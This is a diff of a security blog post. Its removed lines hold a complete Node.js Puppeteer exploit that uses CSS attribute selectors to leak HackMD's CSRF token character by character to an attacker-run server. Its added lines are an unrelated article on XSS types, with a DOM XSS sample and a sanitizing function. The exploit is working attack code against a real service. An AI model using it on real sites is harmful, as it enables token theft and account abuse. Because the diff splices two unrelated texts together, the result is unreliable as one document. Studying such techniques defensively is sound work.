@@ -1,121 +1,50 @@
-The simple diagram is as follows:
+When determining XSS, the first thing to confirm is whether the payload is rendered by the frontend or backend. If it is rendered by the frontend, regardless of where the data comes from (database, URL, or anywhere else), it is DOM-based XSS. If it is rendered by the backend, then it is either Stored or Reflected.
 
-![flow](/img/css-injection-1/p4.png)
+Therefore, both of the previous questions are classified as DOM-based XSS because they are rendered by the frontend.
 
-The code is as follows:
+The article provides a similar example:
 
-``` js
-const puppeteer = require('puppeteer');
-const express = require('express')
-
-const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
-
-// Create a hackMD document and let anyone can view/edit
-const noteUrl = 'https://hackmd.io/1awd-Hg82fekACbL_ode3aasf'
-const host = 'http://localhost:3000'
-const baseUrl = host + '/extract?q='
-const port = process.env.PORT || 3000
-
-;(async function() {
-  const app = express()
-  const browser = await puppeteer.launch({
-    headless: true
-  });
-  const page = await browser.newPage();
-  await page.setViewport({ width: 1280, height: 800 })
-  await page.setRequestInterception(true);
-
-  page.on('request', request => {
-    const url = request.url()
-    // cancel request to self
-    if (url.includes(baseUrl)) {
-      request.abort()
-    } else {
-      request.continue()
-    }
-  });
-  app.listen(port, () => {
-    console.log(`Listening at http://localhost:${port}`)
-    console.log('Waiting for server to get ready...')
-    startExploit(app, page)
-  })
-})()
-
-async function startExploit(app, page) {
-  let currentToken = ''
-  await page.goto(noteUrl + '?edit');
-  
-  // @see: https://stackoverflow.com/questions/51857070/puppeteer-in-nodejs-reports-error-node-is-either-not-visible-or-not-an-htmlele
-  await page.addStyleTag({ content: "{scroll-behavior: auto !important;}" });
-  const initialPayload = generateCss()
-  await updateCssPayload(page, initialPayload)
-  console.log(`Server is ready, you can open ${noteUrl}?view on the browser`)
-
-  app.get('/extract', (req, res) => {
-    const query = req.query.q
-    if (!query) return res.end()
-
-    console.log(`query: ${query}, progress: ${query.length}/36`)
-    currentToken = query
-    if (query.length === 36) {
-      console.log('over')
-      return
-    }
-    const payload = generateCss(currentToken)
-    updateCssPayload(page, payload)
-    res.end()
-
-  })
-}
-
-async function updateCssPayload(page, payload) {
-  await sleep(300)
-  await page.click('.CodeMirror-line')
-  await page.keyboard.down('Meta');
-  await page.keyboard.press('A');
-  await page.keyboard.up('Meta');
-  await page.keyboard.press('Backspace');
-  await sleep(300)
-  await page.keyboard.sendCharacter(payload)
-  console.log('Updated css payload, waiting for next request')
-}
-
-function generateCss(prefix = "") {
-  const csrfTokenChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_'.split('')
-  return `
-${prefix}
-<style>
-    head, meta {
-        display: block;
-    }
-    ${
-      csrfTokenChars.map(char => `
-        meta[name="csrf-token"][content^="${prefix + char}"] {
-            background: url(${baseUrl}${prefix + char})
-        }
-      `).join('\n')
-    }
-</style>
-  `
-}
-
+``` html
+<HTML>
+<TITLE>Welcome!</TITLE>
+Hi
+<SCRIPT>
+var pos=document.URL.indexOf("name=")+5;
+document.write(document.URL.substring(pos,document.URL.length));
+</SCRIPT>
+<BR>
+Welcome to our system
+…
+</HTML>
 ```
 
-You can run it directly with Node.js. After running it, open the corresponding file in the browser, and you can see the progress of the leak in the terminal.
+The comment in the article specifically states:
 
-However, even if you steal HackMD's CSRF token, you still cannot perform CSRF attacks because HackMD checks other HTTP request headers such as origin or referer on the server to ensure that the request comes from a legitimate place.
+> The malicious payload was not embedded in the raw HTML page at any time (unlike the other flavors of XSS).
 
-## Summary
+Because the payload does not actually exist in any HTML page (it is changed later using JavaScript), it does not belong to Stored or Reflected, but is a new type of XSS.
 
-In this article, we saw the principle of using CSS to steal data, which is to use the "attribute selector" plus the simple function of "loading images", and demonstrated how to steal data from hidden inputs and meta tags, using HackMD as a practical example.
+As for the repair method, since it is rendered by JavaScript on the frontend, encoding is the responsibility of the frontend developer. A common method is as follows (code taken from [Sanitizing user input before adding it to the DOM in Javascript](https://stackoverflow.com/questions/2794137/sanitizing-user-input-before-adding-it-to-the-dom-in-javascript)):
 
-However, there are still some questions that we have not answered, such as:
+``` js
+function sanitize(string) {
+  const map = {
+      '&': '&amp;',
+      '<': '&lt;',
+      '>': '&gt;',
+      '"': '&quot;',
+      "'": '&#x27;',
+      "/": '&#x2F;',
+  };
+  const reg = /[&<>"'/]/ig;
+  return string.replace(reg, (match)=>(map[match]));
+}
+```
 
-1. HackMD can load new styles without refreshing the page because it can synchronize content in real-time. What about other websites? How do you steal the second character and beyond?
-2. If you can only steal one character at a time, do you have to steal for a long time? Is this feasible in practice?
-3. Is there a way to steal things other than attributes? For example, the text content on the page, or even JavaScript code?
-4. What are the defense methods against this attack method?
+However, it is important to note that this is not enough to prevent XSS. The defense against XSS is more complicated because it requires handling different situations. For example, if your output needs to be placed inside `<a href="">`, you need to consider payloads in the form of `javascript:alert(1)`. In this case, the sanitize function above is not useful.
 
-We will answer these questions one by one in the next article.
+## Conclusion
 
-Link to the next article: https://blog.huli.tw/2022/09/29/en/css-injection-2
+The reason for the initial confusion was because the vulnerability classification reported on the [HITCON ZeroDay](https://zeroday.hitcon.org/) platform was changed, which made me realize that I had misunderstood the classification. I would like to thank the reviewers for their work.
+
+In addition to these classifications, there are other ways to classify XSS, such as Self XSS, where users need to enter their own XSS payloads, or Mutation XSS, which exploits inconsistent HTML parsing. These are all interesting applications of XSS, and I will share more with you in the future.
